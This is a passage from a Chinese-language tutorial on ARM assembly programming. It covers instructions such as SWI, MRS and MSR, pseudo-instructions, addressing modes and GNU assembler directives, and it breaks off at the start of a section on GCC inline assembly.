{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}</code><br>​        其中：coproc 指令操作的协处理器名。标准名为pn，n为0～15。<br>​        opcodel 协处理器的特定操作码。<br>​        Rd 作为目标寄存器。<br>​        CRn 存放第1 个操作数的协处理器寄存器。<br>​        CRm 存放第2 个操作数的协处理器寄存器。<br>​        opcode2 可选的协处理器特定操作码。<br>​        MRC 指令举例如下：<br>​        MRC p5,2,R2,c3,c2<br>​        MRC p7,0,R0,c1,c2,1</p><h3 id="1-3-5-ARM-杂项指令"><a href="#1-3-5-ARM-杂项指令" class="headerlink" title="1.3.5.   ARM 杂项指令"></a>1.3.5.   ARM 杂项指令</h3><p>​        表A-8给出全部的ARM协处理器指令。</p><p>表A-8 ARM杂项指令</p><p><strong>SWI</strong></p><p>​        软中断指令。SWI 指令用于产生软中断，从而实现在用户模式变换到管理模式，CPSR保存到管理模式的SPSR中，执行转移到SWI 向量，在其它模式下也可使用SWI 指令，处理同样地切换到管理模式。指令格式如下：<br>​       <code>SWI{cond} immed_24</code><br>​        其中：immed_24 24 位立即数，值为0～16777215 之间的整数。<br>​        SWI 指令举例如下：<br>​        SWI 0 ;软中断，中断立即数为0<br>​        SWI 0x123456 ;软中断，中断立即数为0x123456<br>​        使用SWI 指令时，通常使用以下两种方法进行传递参数，SWI 异常中断处理程序就可以提供相关的服务，这两种方法均是用户软件协定。SWI异常中断处理程序要通过读取引起软中断的SWI 指令，以取得24 位立即数。<br>​        （A）指令24 位的立即数指定了用户请求的服务类型，参数通过用寄存器传递。<br>​        MOV R0,#34     ;设置了功能号为34<br>​        SWI 12        ;调用12 号软中断<br>​        （B）指令中的24 位立即数被忽略，用户请求的服务类型由寄存器R0 的值决定，参数通过其它的通用寄存器传递。<br>​        MOV R0,#12     ;调用12 号软中断<br>​        MOV R1,#34     ;设置子功能号为34<br>​        SWI 0       ;<br>​        在SWI 异常中断处理程序中，取出SWI 立即数的步骤为：首先确定引起软中断的SWI指令是ARM指令还时Thumb 指令，这可通过对SPSR 访问得到：然后要取得该SWI 指令的地址，这可通过访问LR 寄存器得到：接着读出指令，分解出立即数。<br>​        读出SWI 立即数：<br>​        T_bit EQU 0x20<br>​        SWI_Hander<br>​        STMFD SP!,{R0_R3,R12,LR}        ;现场保护<br>​        MRS R0,SPSR                    ;读取SPSR<br>​        STMFD SP!,{R0}                    ;保存SPSR<br>​        TST R0,#T_bit                    ;测试T标志位<br>​        LDRNEH R0,[LR,#-2]                ;若是Thumb指令，读取指令码(16 位)<br>​        BICNE R0,R0,#0xFF00            ;取得Thumb 指令的8 位立即数<br>​        LDREQ R0,[LR,#-4]                ;若是ARM 指令，读取指令码(32 位)<br>​        BICNQ R0,R0,#0xFF00000            ;取得ARM 指令的24 位立即数<br>​        …<br>​        LDMFD SP!,{R0-R3,R12,PC}^ ;SWI 异常中断返回</p><h4 id="MRS"><a href="#MRS" class="headerlink" title="MRS"></a><strong>MRS</strong></h4><p>​        读状态寄存器指令。在ARM 处理器中，只有MRS 指令可以状态寄存器CPSR或SPSR读出到通用寄存器中。指令格式如下：<br>​        <code>MRS{cond} Rd ,psr</code><br>​        其中： Rd 目标寄存器。Rd 不允许为R15。<br>​        psr CPSR 或SPSR<br>​        MRS指令举例如下：<br>​        MRS R1,CPSR     ;将CPSR状态寄存器读取，保存到R1 中<br>​        MRS R2,SPSR     ;将SPSR状态寄存器读取，保存到R2 中<br>​        MRS 指令读取CPSR，可用来判断ALU 的状态标志，或IRQ、FIQ中断是否允许等；在异常处理程序中，读SPSR 可知道进行异常前的处理器状态等。MRS 与MSR 配合使用，实现CPSR 或SPSR 寄存器的读—修改—写操作，可用来进行处理器模式切换()，允许/禁止IRQ/FIQ中断等设置。另外，进程切换或允许异常中断嵌套时，也需要使用MRS 指令读取SPSR 状态值。保存起来。<br>​        使能IRQ 中断例程：<br>​        ENABLE_IRQ<br>​        MRS R0,CPSR<br>​        BIC R0。R0,#0x80<br>​        MSR CPSR_c,R0<br>​        MOV PC,LR<br>​        禁能IRQ 中断例程：<br>​        DISABLE_IRQ<br>​        MRS R0,CPSR<br>​        ORR R0,R0,#0x80<br>​        MSR CPSR_c,R0<br>​        MOV PC,LR</p><h4 id="MSR"><a href="#MSR" class="headerlink" title="MSR"></a><strong>MSR</strong></h4><p>​        写状态寄存器指令。在ARM 处理器中。只有MSR 指令可以直接设置状态寄存器CPSR或SPSR。指令格式如下：<br>​        <code>MSR{cond} psr_fields,#immed_8r</code><br>​        <code>MSR{cond} psr_fields,Rm</code><br>​        其中： psr CPSR 或SPSR<br>​        fields 指定传送的区域。Fields 可以是以下的一种或多种(字母必须为小写)：<br>​        c 控制域屏蔽字节(psr[7…0])<br>​        x 扩展域屏蔽字节(psr[15…8])<br>​        s 状态域屏蔽字节(psr[23。…16])<br>​        f 标志域屏蔽字节(psr[31…24])<br>​        immed_8r 要传送到状态寄存器指定域的立即数，8 位。<br>​        Rm 要传送到状态寄存器指定域的数据的源寄存器。<br>​        MSR 指令举例如下：<br>​        MSR CPSR_c,#0xD3 ;CPSR[7…0]=0xD3，即切换到管理模式。<br>​        MSR CPSR_cxsf,R3 ;CPSR=R3<br>​        只有在特权模式下才能修改状态寄存器。<br>​        程序中不能通过MSR 指令直接修改CPSR 中的T 控制位来实现ARM 状态/Thumb状态的切换，必须使用BX 指令完成处理器状态的切换(因为BX 指令属转移指令，它会打断流水线状态，实现处理器状态切换)。MRS 与MSR 配合使用，实现CPSR或SPSR 寄存器的读-修改-写操作，可用来进行处理器模式切换、允许/禁止IRQ/FIQ 中断等设置。<br>​        堆栈指令实始化例程：<br>​        INITSTACK<br>​        MOV R0,LR ;保存返回地址<br>​        ;设置管理模式堆栈<br>​        MSR CPSR_c,#0xD3<br>​        LDR SP,StackSvc<br>​                      ;设置中断模式堆栈<br>​        MSR CPSR_c,#0xD2<br>​        LDR SP,StackIrq<br>​        …</p><h3 id="1-3-6-ARM-伪指令"><a href="#1-3-6-ARM-伪指令" class="headerlink" title="1.3.6.   ARM 伪指令"></a>1.3.6.   ARM 伪指令</h3><p>​       ARM 伪指令不是ARM 指令集中的指令，只是为了编程方便编译器定义了伪指令，使用时可以像其它ARM 指令一样使用，但在编译时这些指令将被等效的ARM 指令代替。ARM伪指令有四条，分别为ADR 伪指令、ADRL 伪指令、LDR 伪指令和NOP 伪指令。</p><h4 id="ADR"><a href="#ADR" class="headerlink" title="ADR"></a><strong>ADR</strong></h4><p>​        小范围的地址读取伪指令。ADR 指令将基于PC 相对偏移的地址值读取到寄存器中。在汇编编译源程序时，ADR伪指令被编译器替换成一条合适的指令。通常，编译器用一条ADD 指令或SUB 指令来实现该ADR 伪指令的功能，若不能用一条指令实现，则产生错误，编译失败。<br>​        ADR 伪指令格式如下：<br>​       <code>ADR{cond} register,exper</code><br>​        其中：register 加载的目标寄存器。<br>​        exper 地址表达式。当地址值是非字地齐时，取值范围-255～255 字节之间；当地址是字对齐时，取值范围-1020～1020字节之间。<br>​        对于基于PC 相对偏移的地址值时，给定范围是相对当前指令地址后两个字处(因为ARM7TDMI为三级流水线)。<br>​        ADR 伪指令举例如下：<br>​        LOOP MOV R1, #0xF0<br>​        …<br>​        ADR R2, LOOP        ;将LOOP 的地址放入R2<br>​        ADR R3, LOOP+4<br>​        可以用ADR 加载地址，实现查表：<br>​        …<br>​        ADR R0,DISP_TAB     ;加载转换表地址<br>​        LDRB R1,[R0,R2]     ;使用R2作为参数，进行查表<br>​        …<br>​        DISP_TAB<br>​        DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90</p><h4 id="ADRL"><a href="#ADRL" class="headerlink" title="ADRL"></a><strong>ADRL</strong></h4><p>​        中等范围的地址读取伪指令。ADRL 指令将基于PC 相对偏移的地址值或基于寄存器相对偏移的地址值读取到寄存器中，比ADR伪指令可以读取更大范围的地址。在汇编编译源程序时，ADRL 伪指令被编译器替换成两个条合适的指令。若不能用两条指令实现ADRL 伪指令功能，则产生错误，编译失败。ADRL伪指令格式如下：<br>​        <code>ADR{cond} register,exper</code><br>​        其中：register 加载的目标寄存器。<br>​        expr 地址表达式。当地址值是非字对齐时，取范围-64K～64K 字节之间；当地址值是字对齐时，取值范围-256K～256K字节之间。<br>​        ADRL 伪指令举例如下：<br>​        ADRL R0,DATA_BUF<br>​        …<br>​        ADRL R1 DATA_BUF+80<br>​        …<br>​        DATA_BUF<br>​        SPACE 100     ;定义100 字节缓冲区<br>​        可以且用ADRL 加载地址，实现程序跳转，中等范围地址的加载：<br>​        …<br>​        ADR LR,RETURNI            ;设置返回地址<br>​        ADRL R1Thumb_Sub+1        ;取得了Thumb 子程序入口地址，且R1 的0 位置1<br>​        BX R1                    ;调用Thumb子程序，并切换处理器状态<br>​        RETURNI<br>​        …<br>​        CODE16<br>​        Thumb_Sub<br>​        MOV R1,#10<br>​        …</p><h4 id="LDR"><a href="#LDR" class="headerlink" title="LDR"></a><strong>LDR</strong></h4><p>​        大范围的地址读取伪指令。LDR 伪指令用于加载32 位的立即数或一个地址值到指定寄存器。在汇编编译源程序时，LDR伪指令被编译器替换成一条合适的指令。若加载的常数未超出MOV 或MVN 的范围，则使用MOV 或MVN 指令代替该LDR 伪指令，否则汇编器将常量放入字池，并使用一条程序相对偏移的LDR指令从文字池读出常量。LDR 伪指令格式如下：<br>​        <code>LDR{cond} register,=expr/label_expr</code><br>​        其中：register 加载的目标寄存器<br>​        expr 32 位立即数。<br>​        label_expr 基于PC 的地址表达式或外部表达式。<br>​        LADR 伪指令举例如下：。<br>​        LDR R0,=0x123456        ;加载32 位立即数0x12345678<br>​        LDR R0,=DATA_BUF+60    ;加载DATA_BUF 地址+60<br>​        …<br>​        LTORG                    ;声明文字池<br>​        伪指令LDR 常用于加载芯片外围功能部件的寄存器地址(32 位立即数)，以实现各种控制操作加载32位立即数：<br>​        …<br>​        LDR R0,=IOPIN ;加载GPIO 寄存器IOPIN 的地址<br>​        LDR R1,[R0] ;读取IOPIN 寄存器的值<br>​        …<br>​        LDR R0,=IOSET<br>​        LDR R1,=0x00500500<br>​        STR R1,[R0] ;IOSET=0x00500500<br>​        …<br>​        从PC 到文字池的偏移量必须小于4KB。与ARM 指令的LDR 相比，伪指令的LDR的参数有“=”号</p><h4 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a><strong>NOP</strong></h4><p>​        空操作伪指令。NOP 伪指令在汇编时将会被代替成ARM 中的空操作，比如可能为“MOV R0, R0”指令等，NOP 伪指令格式如下：<br>​        NOP<br>​        NOP<br>​        NOP<br>​        NOP<br>​        SUBS R1, R1, #1<br>​        BNE DELAY1<br>​        …</p><h2 id="1-4-寻址方式"><a href="#1-4-寻址方式" class="headerlink" title="1.4.    寻址方式"></a>1.4.    寻址方式</h2><h3 id="1-4-1-立即数寻址"><a href="#1-4-1-立即数寻址" class="headerlink" title="1.4.1.   立即数寻址"></a>1.4.1.   立即数寻址</h3><p>立即数前面有“#”号，并且如果是十六进制数则在“#”后添加“0x”或“&amp;”，二进制数“#”后面加“%”。</p><h3 id="1-4-2-寄存器寻址"><a href="#1-4-2-寄存器寻址" class="headerlink" title="1.4.2.   寄存器寻址"></a>1.4.2.   寄存器寻址</h3><h3 id="1-4-3-寄存器间接寻址"><a href="#1-4-3-寄存器间接寻址" class="headerlink" title="1.4.3.   寄存器间接寻址"></a>1.4.3.   寄存器间接寻址</h3><p>以寄存器中的值作为操作数的地址，而操作数本身放在存储器中。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD R0，R1，[R2]</span><br></pre></td></tr></table></figure><h3 id="1-4-4-基址变址寻址"><a href="#1-4-4-基址变址寻址" class="headerlink" title="1.4.4.   基址变址寻址"></a>1.4.4.   基址变址寻址</h3><p>将寄存器的内容与指令中给出的地址偏移量相加，从而得到一个操作数的有效地址。</p><p>例如：<code>LDR R0，[R1，#4]  R0&lt;-[R1+4]</code></p><h3 id="1-4-5-多寄存器寻址"><a href="#1-4-5-多寄存器寻址" class="headerlink" title="1.4.5.   多寄存器寻址"></a>1.4.5.   多寄存器寻址</h3><p>一条指令可以完成多个寄存器值得传递，一条指令传送最多16个通用寄存器的值。</p><p><code>LDMIA  R0，{R1，R2，R3，R4}</code></p><h3 id="1-4-6-相对寻址"><a href="#1-4-6-相对寻址" class="headerlink" title="1.4.6.   相对寻址"></a>1.4.6.   相对寻址</h3><p>以程序计数器PC的值作为基地址，指令中的地址标号作为偏移量，将两者相加后得到的操作数的有效地址。</p><p>例如：<code>BL NEXT;</code></p><h3 id="1-4-7-堆栈寻址"><a href="#1-4-7-堆栈寻址" class="headerlink" title="1.4.7.   堆栈寻址"></a>1.4.7.   堆栈寻址</h3><p>使用一个堆栈指针的专用寄存器指示当前操作位置</p><p>递增堆栈：向高地址方向生长</p><p>递减堆栈：向低地址方向生长</p><p>满堆栈：堆栈指针指向最后压入堆栈的有效数据</p><p>空堆栈：堆栈指针指向下一个要放入数据的空位置</p><h1 id="2-GNU-ARM混编"><a href="#2-GNU-ARM混编" class="headerlink" title="2.       GNU ARM混编"></a>2.       GNU ARM混编</h1><p>​         汇编源程序一般用于系统最基本的初始化：初始化堆栈指针、设置页表、操作 ARM的协处理器等。这些初始化工作完成后就可以跳转到C代码main函数中执行。</p><h2 id="1-1-GNU汇编语言语句格式"><a href="#1-1-GNU汇编语言语句格式" class="headerlink" title="1.1.     GNU汇编语言语句格式"></a>1.1.     GNU汇编语言语句格式</h2><p>​    任何<a href="http://lib.csdn.net/base/linux" target="_blank" rel="noopener">Linux</a>汇编行都是如下结构：<strong>[<label>:][<instruction or directive pseudo-instruction>} @comment</instruction></label></strong></p><p>l        instruction为指令</p><p>l        directive为伪操作</p><p>l        pseudo-instruction为伪指令</p><p>l        <strong><label>:</label></strong>为标号, GNU汇编中，任何以冒号结尾的标识符都被认为是一个标号，而不一定非要在一行的开始。</p><p>l        comment为语句的注释</p><p>下面定义一个”add”的函数，最终返回两个参数的和：</p><p>.section.text, “x”</p><p>.globaladd      @ give the symbol “add” externallinkage</p><p>add:</p><p>​    ADD r0, r0, r1 @ add input arguments</p><p>​    MOV pc, lr  @ return from subroutine</p><p>@ endof program</p><p>注意：</p><p>l         ARM指令，伪指令，伪操作，寄存器名可以全部为大写字母，也可全部为小写字母，但不可大小写混用。</p><p>l         如果语句太长，可以将一条语句分几行来书写，在行末用“\”表示换行（即下一行与本行为同一语句）。“\”后不能有任何字符，包含空格和制表符（Tab)。</p><h2 id="1-2-GNU汇编程序中的标号symbol（或label）"><a href="#1-2-GNU汇编程序中的标号symbol（或label）" class="headerlink" title="1.2.     GNU汇编程序中的标号symbol（或label）"></a>1.2.     GNU汇编程序中的标号symbol（或label）</h2><p>​    标号只能由a～z，A～Z，0～9，“<strong>.</strong>”，_等（由点、字母、数字、下划线等组成，除局部标号外，不能以数字开头）字符组成。</p><p>Symbol的本质：代表它所在的地址,因此也可以当作变量或者函数来使用。</p><p>l         段内标号的地址值在汇编时确定；</p><p>l         段外标号的地址值在连接时确定。</p><p>Symbol的分类：3类（依据标号的生成方式）。</p><p><strong><1></1></strong>    基于PC的标号。基于PC的标号是位于目标指令前的标号或者程序中数据定义伪操作前的标号。这种标号在汇编时将被处理成PC值加上（或减去）一个数字常量，常用于表示跳转指令<strong>”b”</strong>等的目标地址，或者代码段中所嵌入的少量数据。</p><p><strong><2></2></strong>    基于寄存器的标号。基于寄存器的标号常用MAP和FIELD来定义，也可以用EQU来定义。这种标号在汇编时将被处理成寄存器的值加上（或减去）一个数字常量，常用于访问数据段中的数据。</p><p><strong><3></3></strong>    绝对地址。绝对地址是一个32位数据。它可以寻址的范围为[0，232-1]即可以直接寻址整个内存空间。</p><p><strong>特别说明：</strong>局部标号Symbol</p><p>​    局部标号主要在局部范围内使用，而且局部标号可以重复出现。它由两部组成：开头是一个0-99直接的数字，后面紧接一个通常表示该局部变量作用范围的符号。局部变量的作用范围通常为当前段，也可以用<strong>ROUT</strong>来定义局部变量的作用范围。</p><p>​    局部变量定义的语法格式：<strong>N{routname}</strong></p><p>l         N：为0~99之间的数字。</p><p>l         routname：当前局部范围的名称（为符号），通常为该变量作用范围的名称（用ROUT伪操作定义的）。</p><p>​    局部变量引用的语法格式：<strong>%{F|B}{A|T}N{routname}</strong></p><p>l         %：表示引用操作</p><p>l         N：为局部变量的数字号</p><p>l         routname：为当前作用范围的名称（用ROUT伪操作定义的）</p><p>l         F：指示编译器只向前搜索</p><p>l         B：指示编译器只向后搜索</p><p>l         A：指示编译器搜索宏的所有嵌套层次</p><p>l         T：指示编译器搜索宏的当前层次</p><p>例：使用局部符号的例子，一段循环程序</p><p>subs r0, r0, #1 @每次循环使r0=r0-1</p><p>bne 1F      @跳转到1标号去执行</p><p>注意：</p><p>l         如果F和B都没有指定，编译器先向前搜索，再向后搜索</p><p>l         如果A和T都没有指定，编译器搜索所有从当前层次到宏的最高层次，比当前层次低的层次不再搜索。</p><p>l         如果指定了routname，编译器向前搜索最近的ROUT伪操作，若routname与该ROUT伪操作定义的名称不匹配，编译器报告错误，汇编失败。</p><h2 id="1-3-GNU汇编程序中的分段"><a href="#1-3-GNU汇编程序中的分段" class="headerlink" title="1.3.     GNU汇编程序中的分段"></a>1.3.     GNU汇编程序中的分段</h2><p><strong><1></1></strong>    .section伪操作</p><p>.section &lt;section_name&gt; {,”<flags>”}</flags></p><p>Startsa new code or data section. Sections in GNU are called .text, a code section, .data, an initializeddata section, and .bss, an uninitialized data section.</p><p>Thesesections have default flags, and the linker understands the default names(similardirective to the armasm directive AREA).The following are allowable <strong>.section flags</strong> for ELF format files:</p><p><flag>     Meaning</flag></p><p>a       allowable section</p><p>w       writable section</p><p>x       executable section</p><p>中文解释：</p><p>用户可以通过.section伪操作来自定义一个段,格式如下：</p><p><strong>.section section_name [,”flags”[, %type[,flag_specific_arguments]]]</strong></p><p>  每一个段以段名为开始, 以下一个段名或者文件结尾为结束。这些段都有缺省的标志（flags），连接器可以识别这些标志。(与arm asm中的AREA相同)。下面是ELF格式允许的段标志flags：</p><p>&lt;标志&gt;     含义</p><p>a          允许段</p><p>w          可写段</p><p>x          执行段</p><p>例：定义一个“段”</p><p>.section.mysection    @自定义数据段，段名为 “.mysection”</p><p>.align  2</p><p>strtemp:</p><p>​     .ascii “Temp string \n\0” @对这一句的理解，我觉得应该是：将”Temp string \n\0”这个字符串存储在以标号strtemp为起始地址的一段内存空间里</p><p><strong><2></2></strong>    汇编系统预定义的段名</p><p>l         .text     @代码段</p><p>l         .data    @初始化数据段.data Read-write initialized long data.</p><p>l         .bss     @未初始化数据段</p><p>l         .sdata   @ .sdata Read-write initialized short data.</p><p>l         .sbss    @</p><p>注意：源程序中.bss段应该在.text段之前。</p><h2 id="1-4-GNU汇编语言定义入口点"><a href="#1-4-GNU汇编语言定义入口点" class="headerlink" title="1.4.     GNU汇编语言定义入口点"></a>1.4.     GNU汇编语言定义入口点</h2><p>汇编程序的缺省入口是<strong>_start</strong>标号，<strong>用户也可以在连接脚本文件中用ENTRY标志指明其它入口点</strong>。</p><p>例：定义入口点</p><p>.section .data</p><p>&lt; initialized data here&gt;</p><p>.section .bss</p><p>&lt; uninitialized data here&gt;</p><p>.section .text</p><p>.globl  _start</p><p>_start:</p><instruction code goes here><h2 id="1-5-GNU汇编程序中的宏定义"><a href="#1-5-GNU汇编程序中的宏定义" class="headerlink" title="1.5.     GNU汇编程序中的宏定义"></a>1.5.     GNU汇编程序中的宏定义</h2><p>格式如下：</p><p>.macro 宏名参数名列表  @伪指令.macro定义一个宏</p><p>宏体</p><p>.endm                   @.endm表示宏结束</p><p>​    如果宏使用参数,那么在宏体中使用该参数时添加前缀<strong>“\”</strong>。宏定义时的参数还可以使用默认值。可以使用.exitm伪指令来退出宏。</p><p>例：宏定义</p><p>.macroSHIFTLEFT a, b</p><p>.if \b&lt; 0</p><p>MOV \a,\a, ASR #-\b</p><p>.exitm</p><p>.endif</p><p>MOV \a,\a, LSL #\b</p><p>.endm</p><h2 id="1-6-GNU汇编程序中的常数"><a href="#1-6-GNU汇编程序中的常数" class="headerlink" title="1.6.     GNU汇编程序中的常数"></a>1.6.     GNU汇编程序中的常数</h2><p><strong><1></1></strong>    十进制数以非0数字开头,如:123和9876；</p><p><strong><2></2></strong>    二进制数以0b开头,其中字母也可以为大写；</p><p><strong><3></3></strong>    八进制数以0开始,如:0456,0123；</p><p><strong><4></4></strong>    十六进制数以0x开头,如:0xabcd,0X123f；</p><p><strong><5></5></strong>    字符串常量需要用引号括起来,中间也可以使用转义字符,如: “You are welcome!\n”；</p><p><strong><6></6></strong>    当前地址以“<strong>.</strong>”表示,在<strong>GNU</strong>汇编程序中可以使用这个符号代表当前指令的地址；</p><p><strong><7></7></strong>    表达式：在汇编程序中的表达式可以使用常数或者数值, “-”表示取负数, “~”表示取补,“&lt;&gt;”表示不相等,其他的符号如:+、-、*、/、%、&lt;、&lt;&lt;、&gt;、&gt;&gt;、|、&amp;、^、!、==、&gt;=、&lt;=、&amp;&amp;、|| 跟C语言中的用法相似。</p><h2 id="1-7-GNU-ARM汇编的常用伪操作"><a href="#1-7-GNU-ARM汇编的常用伪操作" class="headerlink" title="1.7.     GNU ARM汇编的常用伪操作"></a>1.7.     GNU ARM汇编的常用伪操作</h2><p>​    在前面已经提到过了一些为操作，还有下面一些为操作：</p><p>l         数据定义伪操作： .byte，.short，.long，.quad，.float，.string/.asciz/.ascii，重复定义伪操作.rept，赋值语句.equ/.set ；</p><p>l         函数的定义；</p><p>l         对齐方式伪操作 .align；</p><p>l         源文件结束伪操作.end；</p><p>l         .include伪操作；</p><p>l         if伪操作；</p><p>l         .global/ .globl 伪操作；</p><p>l         .type伪操作；</p><p>l         列表控制语句；</p><p>别于<strong>GNU</strong> <strong>AS</strong>汇编的通用伪操作,下面是ARM特有的伪操作：</p><p>.reg ，.unreq ，.code ，.thumb ，.thumb_func ，.thumb_set， .ltorg ，.pool</p><p><strong><1></1></strong>    数据定义伪操作</p><p>l        .byte:单字节定义，如：.byte 1,2,0b01,0x34,072,’s’ ；</p><p>l        .short:定义双字节数据，如:.short 0x1234,60000 ；</p><p>l        .long:定义4字节数据，如:.long 0x12345678,23876565</p><p>l        .quad:定义8字节，如:.quad 0x1234567890abcd</p><p>l        .float：定义浮点数，如：.float <strong>0f</strong>-314159265358979323846264338327\</p><p>​    95028841971.693993751E-40 @ <strong>- pi</strong></p><p>l        .string/.asciz/.ascii：定义多个字符串，如:</p><p>.string “abcd”,”efgh”, “hello!”</p><p>.asciz “qwer”,”sun”, “world!”</p><p>.ascii “welcome\0”</p><p>​     注意：ascii伪操作定义的字符串需要自行添加结尾字符’\0’。</p><p>l        .rept:重复定义伪操作, 格式如下：</p><p> .rept 重复次数</p><p>  数据定义</p><p> .endr @结束重复定义</p><p>  例：</p><p> .rept 3</p><p> .byte 0x23</p><p> .endr</p><p>l        .equ/.set: 赋值语句, 格式如下：</p><p>  .equ(.set)变量名，表达式</p><p>  例：</p><p> .equ abc, 3 @让abc=3</p><p><strong><2></2></strong>    函数的定义伪操作</p><p>l         函数的定义,格式如下：</p><p>  函数名<strong>:</strong></p><p>  函数体</p><p>  返回语句</p><p>​    一般的,<strong>函数如果需要在其他文件中调用, 需要用到.global伪操作将函数声明为全局函数。</strong>为了不至于在其他程序在调用某个C函数时发生混乱,对寄存器的使用我们需要遵循APCS准则。函数编译器将处理函数代码为一段.global的汇编码。</p><p>l         函数的编写应当遵循如下规则：</p><p><strong>a.</strong>         a1-a4寄存器（参数、结果或暂存寄存器，r0到r3 的同义字）以及浮点寄存器f0-f3(如果存在浮点协处理器)在函数中是不必保存的；</p><p><strong>b.</strong>         如果函数返回一个不大于一个字大小的值，则在函数结束时应该把这个值送到 r0 中；</p><p><strong>c.</strong>         如果函数返回一个浮点数，则在函数结束时把它放入浮点寄存器f0中；</p><p><strong>d.</strong>         如果函数的过程改动了sp（堆栈指针，r13）、fp（框架指针，r11）、sl（堆栈限制，r10）、lr（连接寄存器，r14）、v1-v8（变量寄存器，r4 到 r11）和 f4-f7,那么函数结束时这些寄存器应当被恢复为包含在进入函数时它所持有的值。</p><p><strong><3></3></strong>    .align .end .include .incbin伪操作</p><p>l        .align:用来指定数据的对齐方式,格式如下:</p><p>​         .align [absexpr1, absexpr2]</p><p>​      以某种对齐方式,<strong>在未使用的存储区域填充值</strong>. <strong>第一个值表示对齐方式,4, 8,16或 32.第二个表达式值表示填充的值。</strong></p><p>l        .end:表明源文件的结束。</p><p>l        .include:可以将指定的文件在使用.include 的地方展开,一般是头文件,例如:</p><p>​         .include “myarmasm.h”</p><p>l        .incbin伪操作可以将原封不动的一个二进制文件编译到当前文件中,使用方法如下:</p><p>​         .incbin”file”[,skip[,count]]</p><p>​         skip表明是从文件开始跳过skip个字节开始读取文件,count是读取的字数.</p><p><strong><4></4></strong>    ..if伪操作</p><p>​    根据一个表达式的值来决定是否要编译下面的代码, 用.endif伪操作来表示条件判断的结束,中间可以使用.else来决定.if的条件不满足的情况下应该编译哪一部分代码。</p><p>.if有多个变种:</p><p>.ifdefsymbol           @判断symbol是否定义</p><p>.ifcstring1,string2      @字符串string1和string2是否相等,字符串可以用单引号括起来</p><p>.ifeqexpression        @判断expression的值是否为0</p><p>.ifeqsstring1,string2    @判断string1和string2是否相等,字符串必须用双引号括起来</p><p>.ifgeexpression        @判断expression的值是否大于等于0</p><p>.ifgtabsolute expression @判断expression的值是否大于0</p><p>.ifleexpression        @判断expression的值是否小于等于0</p><p>.ifltabsolute expression    @判断expression的值是否小于0</p><p>.ifncstring1,string2        @判断string1和string2是否不相等, 其用法跟.ifc恰好相反。</p><p>.ifndefsymbol, .ifnotdef symbol @判断是否没有定义symbol, 跟.ifdef恰好相反</p><p>.ifneexpression          @如果expression的值不是0, 那么编译器将编译下面的代码</p><p>.ifnesstring1,string2      @如果字符串string1和string2不相等, 那么编译器将编译下面的代码.</p><p><strong><5></5></strong>    .global .type .title .list</p><p>l        .global/ .globl ：用来定义一个全局的符号，格式如下:</p><p>​          .global symbol 或者 .globl symbol</p><p>l         .type：用来指定一个符号的类型是函数类型或者是对象类型, 对象类型一般是数据, 格式如下:</p><p>​          .type 符号, 类型描述</p><p>例：</p><p>.globla</p><p>.data</p><p>.align4</p><p>.typea, @object</p><p>.sizea, 4</p><p>a:</p><p>.long10</p><p>例：</p><p>.section.text</p><p>.typeasmfunc, @function</p><p>.globlasmfunc</p><p>asmfunc:</p><p>mov pc,lr</p><p><strong><6></6></strong>    列表控制语句:</p><p>.title：用来指定汇编列表的标题,例如:</p><p>  .title “my program”</p><p>.list：用来输出列表文件.</p><p><strong><7></7></strong>    ARM特有的伪操作</p><p>l         .reg: 用来给寄存器赋予别名,格式如下:</p><p>​       别名 .req 寄存器名</p><p>l         .unreq: 用来取消一个寄存器的别名,格式如下:</p><p>.unreq 寄存器别名</p><p>​    注意被取消的别名必须事先定义过,否则编译器就会报错,这个伪操作也可以用来取消系统预制的别名, 例如r0, 但如果没有必要的话不推荐那样做。</p><p>l         .code伪操作用来选择ARM或者Thumb指令集,格式如下:</p><p>.code 表达式</p><p>　　如果表达式的值为16则表明下面的指令为Thumb指令,如果表达式的值为32则表明下面的指令为ARM指令.</p><p>l         .thumb伪操作等同于.code 16, 表明使用Thumb指令, 类似的.arm等同于.code 32</p><p>l         .force_thumb伪操作用来强制目标处理器选择thumb的指令集而不管处理器是否支持</p><p>l         .thumb_func伪操作用来指明一个函数是thumb指令集的函数</p><p>l         .thumb_set伪操作的作用类似于.set, 可以用来给一个标志起一个别名, 比.set功能增加的一点是可以把一个标志标记为thumb函数的入口, 这点功能等同于.thumb_func</p><p>l         .ltorg用于声明一个数据缓冲池(literal pool)的开始,它可以分配很大的空间。</p><p>l         .pool的作用等同.ltorg</p><p>l         .space&lt;number_of_bytes&gt; {,&lt;fill_byte&gt;}</p><p>​    分配number_of_bytes字节的数据空间，并填充其值为fill_byte，若未指定该值，缺省填充0。（与armasm中的SPACE功能相同）</p><p>l         .word <word1>{,<word2>} …<strong>插入一个32-bit的数据队列。</strong>（与armasm中的DCD功能相同）<strong>可以使用.word把标识符作为常量使用。</strong></word2></word1></p><p>例：</p><p>Start:</p><p>valueOfStart:</p><p>​     .word Start</p><p><strong>这样程序的开头Start便被存入了内存变量valueOfStart中。</strong></p><p>l         .hword<short1> {,<short2>} …</short2></short1></p><p>   插入一个16-bit的数据队列。（与armasm中的DCW相同）</p><h2 id="1-8-GNU-ARM汇编特殊字符和语法"><a href="#1-8-GNU-ARM汇编特殊字符和语法" class="headerlink" title="1.8.     GNU ARM汇编特殊字符和语法"></a>1.8.     GNU ARM汇编特殊字符和语法</h2><p><1>    代码行中的注释符号: ‘@’</1></p><p><2>    整行注释符号: ‘#’</2></p><p><3>    语句分离符号: ‘;’</3></p><p><4>    立即数前缀: ‘#’ 或 ‘$’</4></p><h1 id="3-ARM-GCC-内嵌汇编"><a href="#3-ARM-GCC-内嵌汇编" class="headerlink" title="3.       ARM GCC 内嵌汇编"></a>3.       ARM GCC 内嵌汇编</h1><p>对于基于ARM的RISC处理器，GNUC编译器提供了在C代码中内嵌汇编的功能。这种非常酷的特性提供了C代码没有的功能，比如手动优化软件关键部分的代码、使用相关的处理器指令。这里设想了读者是熟练编写ARM汇编程序读者，因为该片文档不是ARM汇编手册。同样也不是<a href="http://lib.csdn.net/base/c" target="_blank" rel="noopener">C语言</a>手册。这篇文档假设使用的是GCC 4 的版本，但是对于早期的版本也有效。</p><p>GCCasm 声明</p><p>让我们以一个简单的例子开始。就像C中的声明一样，下面的声明代码可能出现在你的代码中。</p><p>/<em>NOP 例子 